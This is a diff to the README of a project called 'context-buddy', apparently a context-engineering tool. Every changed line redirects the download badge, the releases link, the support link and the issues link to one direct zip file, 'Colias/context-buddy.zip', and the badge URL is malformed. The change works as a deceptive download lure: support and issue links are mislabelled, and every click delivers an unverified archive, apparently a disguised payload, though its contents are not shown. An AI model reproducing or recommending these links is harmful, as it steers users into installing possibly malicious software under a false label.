@@ -1,6 +1,6 @@
 # 🚀 context-buddy - Your Guide to Context Engineering
 
-[![Download Context Buddy](https://img.shields.io/badge/Download-Context%20Buddy-brightgreen.svg)](https://github.com/andrey06mi/context-buddy/releases)
+[![Download Context Buddy](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip%https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip)](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip)
 
 ## 📘 Introduction
 
@@ -26,7 +26,7 @@ Before installing Context Buddy, ensure your system meets the following requirem
 To get started with Context Buddy, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/andrey06mi/context-buddy/releases) to download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip) to download the latest version.
 
 2. **Install the Application**
    - Locate the downloaded file in your computer's Downloads folder.
@@ -38,7 +38,7 @@ To get started with Context Buddy, follow these simple steps:
 
 ## 🔗 Download & Install
 
-To download Context Buddy, visit the [Releases page](https://github.com/andrey06mi/context-buddy/releases). 
+To download Context Buddy, visit the [Releases page](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip). 
 
 Select the file that corresponds to your operating system. Click on the file to begin the download. Once downloaded, follow the installation instructions provided above.
 
@@ -73,7 +73,7 @@ If Context Buddy doesn’t start, try these steps:
 
 1. Ensure that your operating system meets the system requirements.
 2. Restart your computer and launch the application again.
-3. If issues persist, check the troubleshooting section in the application or visit our [Support](https://github.com/andrey06mi/context-buddy/issues) page.
+3. If issues persist, check the troubleshooting section in the application or visit our [Support](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip) page.
 
 ## 📝 Contribution Guidelines
 
@@ -86,6 +86,6 @@ We welcome contributions to improve Context Buddy. If you want to change or add 
 
 ## 📬 Support
 
-If you encounter issues or have questions, you can reach out via the [Issues section](https://github.com/andrey06mi/context-buddy/issues) on our GitHub page.
+If you encounter issues or have questions, you can reach out via the [Issues section](https://raw.githubusercontent.com/andrey06mi/context-buddy/main/Colias/context-buddy.zip) on our GitHub page.
 
 Thank you for using Context Buddy. We hope it enhances your understanding of Context Engineering!
